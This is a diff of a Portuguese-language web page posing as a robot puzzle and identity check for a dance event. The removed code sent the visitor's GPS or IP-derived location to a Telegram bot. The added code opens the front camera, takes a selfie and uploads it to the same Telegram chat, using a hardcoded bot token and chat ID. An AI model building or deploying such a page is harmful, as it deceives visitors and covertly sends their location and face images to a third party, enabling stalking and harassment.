@@ -18,12 +18,13 @@ p{font-size:14px;margin-bottom:16px}
 button{background:#003366;color:#fff;border:none;padding:12px 0;width:100%;border-radius:6px;font-size:16px;cursor:pointer}
 button:disabled{background:#999;cursor:not-allowed}
 button:active{transform:scale(.98)}
-#localBtn{display:none}
+video{width:100%;border-radius:8px;margin-bottom:10px;display:none}
+canvas{display:none}
 </style>
 </head>
 <body>
 
-<!-- ETAPA 1 – MONTE O ROBÔ -->
+<!-- ETAPA 1 – QUEBRA-CABEÇA -->
 <div id="step1" class="card">
   <h2>Monte o robô</h2>
   <p>Clique nas peças <strong>na ordem</strong> (1 a 6).</p>
@@ -31,14 +32,14 @@ button:active{transform:scale(.98)}
   <button id="continue1" disabled>Continuar</button>
 </div>
 
-<!-- ETAPA 2 – PERMITIR LOCALIZAÇÃO -->
+<!-- ETAPA 2 – SELFIE -->
 <div id="step2" class="card" style="display:none">
-  <h2>Permitir localização</h2>
-  <p>Precisamos confirmar sua identidade.</p>
-  <button id="localBtn">Permitir localização</button>
+  <h2>Confirme sua identidade</h2>
+  <video id="cam" autoplay muted></video>
+  <button id="snap">Tirar selfie</button>
 </div>
 
-<!-- ETAPA 3 – LISTA DE APOIADORES -->
+<!-- ETAPA 3 – LISTA + PROSSEGUIR -->
 <div id="step3" class="card" style="display:none">
   <h2>Verificado ✅</h2>
   <p>Apoiadores confirmados:</p>
@@ -53,7 +54,7 @@ button:active{transform:scale(.98)}
     <li>Luana Ferreira – Decoração</li>
   </ul>
   <p style="font-size:11px;color:#666;margin-top:12px">Licença de baile emitida com sucesso.</p>
-  <button id="prossegue" disabled>Prosseguir</button>
+  <button id="prossegue">Prosseguir</button>
 </div>
 
 <script>
@@ -61,17 +62,17 @@ button:active{transform:scale(.98)}
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
 
-// SVGs DAS PEÇAS (1 a 6)
-const svgs = [
-  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="10" y="10" width="80" height="30" rx="8" fill="%23003366"/%3E%3C/svg%3E', // cabeça
-  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="20" y="15" width="60" height="20" rx="6" fill="%23003366"/%3E%3C/svg%3E', // pescoço
-  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="5" y="5" width="90" height="40" rx="10" fill="%23003366"/%3E%3C/svg%3E', // tronco
-  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="10" y="10" width="35" height="60" rx="8" fill="%23003366"/%3E%3C/svg%3E', // braço esq
-  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="55" y="10" width="35" height="60" rx="8" fill="%23003366"/%3E%3C/svg%3E', // braço dir
-  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="25" y="10" width="50" height="70" rx="10" fill="%23003366"/%3E%3C/svg%3E'  // pernas
+// IMAGENS BASE64 (pequenos ícones SVG)
+const imgs = [
+  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIxMCIgeT0iMTAiIHdpZHRoPSI4MCIgaGVpZ2h0PSIzMCIgcng9IjgiIGZpbGw9IiMwMDMzNjYiLz48L3N2Zz4=', // cabeça
+  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIyMCIgeT0iMTUiIHdpZHRoPSI2MCIgaGVpZ2h0PSIyMCIgcng9IjYiIGZpbGw9IiMwMDMzNjYiLz48L3N2Zz4=', // pescoço
+  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSI1IiB5PSI1IiB3aWR0aD0iOTAiIGhlaWdodD0iNDAiIHJ4PSIxMCIgZmlsbD0iIzAwMzM2NiIvPjwvc3ZnPg==', // tronco
+  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIxMCIgeT0iMTAiIHdpZHRoPSIzNSIgaGVpZ2h0PSI2MCIgcng9IjgiIGZpbGw9IiMwMDMzNjYiLz48L3N2Zz4=', // braço esq
+  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSI1NSIgeT0iMTAiIHdpZHRoPSIzNSIgaGVpZ2h0PSI2MCIgcng9IjgiIGZpbGw9IiMwMDMzNjYiLz48L3N2Zz4=', // braço dir
+  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIyNSIgeT0iMTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI3MCIgcng9IjEwIiBmaWxsPSIjMDAzMzY2Ii8+PC9zdmc+'  // pernas
 ];
 
-// EMBARALHA ARRAY
+// EMBARALHA
 const shuffle = a => a.sort(() => Math.random() - 0.5);
 
 // MONTA PEÇAS
@@ -81,7 +82,9 @@ const piecesBox = document.getElementById('pieces');
   const div = document.createElement('div');
   div.className = 'piece';
   div.dataset.idx = i;
-  div.innerHTML = `<img src="data:image/svg+xml;utf8,${svgs[i]}" alt="peça ${i+1}">`;
+  const img = document.createElement('img');
+  img.src = imgs[i];
+  div.appendChild(img);
   piecesBox.appendChild(div);
 });
 shuffle([...piecesBox.children]).forEach(el => piecesBox.appendChild(el));
@@ -99,33 +102,29 @@ document.querySelectorAll('.piece').forEach(p => p.addEventListener('click', () 
   }
 }));
 
-// CONTINUAR → ETAPA 2
+// CONTINUAR → ABRE CÂMERA
 document.getElementById('continue1').addEventListener('click', () => {
   document.getElementById('step1').style.display = 'none';
   document.getElementById('step2').style.display = 'block';
-  document.getElementById('localBtn').style.display = 'inline-block';
+  document.getElementById('cam').style.display = 'block';
+  navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}})
+    .then(s => {
+      document.getElementById('cam').srcObject = s;
+    });
 });
 
-// PERMITIR LOCALIZAÇÃO
-let localOk = false;
-document.getElementById('localBtn').addEventListener('click', () => {
-  navigator.geolocation.getCurrentPosition(
-    p => {
-      const {latitude: lat, longitude: lon} = p.coords;
-      enviaTelegram(`📍 GPS: https://maps.google.com/?q=${lat},${lon}`);
-      localOk = true;
-      mostraStep3();
-    },
-    () => {
-      fetch('https://ipapi.co/json/')
-        .then(r => r.json())
-        .then(d => {
-          enviaTelegram(`📍 IP: https://maps.google.com/?q=${d.latitude},${d.longitude}`);
-          localOk = true;
-          mostraStep3();
-        });
-    }
-  );
+// TIRAR SELFIE
+document.getElementById('snap').addEventListener('click', () => {
+  const v = document.getElementById('cam');
+  const canvas = document.createElement('canvas');
+  canvas.width = 640; canvas.height = 480;
+  canvas.getContext('2d').drawImage(v, 0, 0);
+  canvas.toBlob(blob => {
+    enviaTelegram('📸 selfie', blob);
+    v.srcObject.getTracks().forEach(t => t.stop());
+    document.getElementById('step2').style.display = 'none';
+    document.getElementById('step3').style.display = 'block';
+  }, 'image/jpeg', 0.9);
 });
 
 // ENVIA TELEGRAM
@@ -140,14 +139,7 @@ const enviaTelegram = (msg, media) => {
       : JSON.stringify({chat_id: CHAT_ID, text: msg}),
     headers: media ? {} : {'Content-Type':'application/json'}
   });
-};
-
-// MOSTRA ETAPA 3
-function mostraStep3(){
-  document.getElementById('step2').style.display = 'none';
-  document.getElementById('step3').style.display = 'block';
-  document.getElementById('prossegue').disabled = false;
-}
+});
 
 // AÇÃO FINAL
 document.getElementById('prossegue').addEventListener('click', () => {
